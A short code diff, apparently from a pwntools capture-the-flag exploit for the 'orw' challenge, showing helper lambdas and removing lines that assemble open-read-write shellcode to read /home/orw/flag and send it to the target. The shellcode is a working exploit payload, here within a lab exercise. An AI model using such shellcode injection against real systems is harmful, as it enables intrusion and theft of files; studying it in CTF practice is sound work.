@@ -16,11 +16,3 @@ itr     = lambda                    :io.interactive()
 uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
 uu64    = lambda data               :u64(data.ljust(8, b'\x00'))
 
-#open file 
-shellcode =  asm(shellcraft.open("/home/orw/flag"))
-shellcode += asm(shellcraft.read('eax', 'ebp', 0x100))
-shellcode += asm(shellcraft.write(1, 'ebp', 0x100))
-
-
-s(shellcode)
-rl()
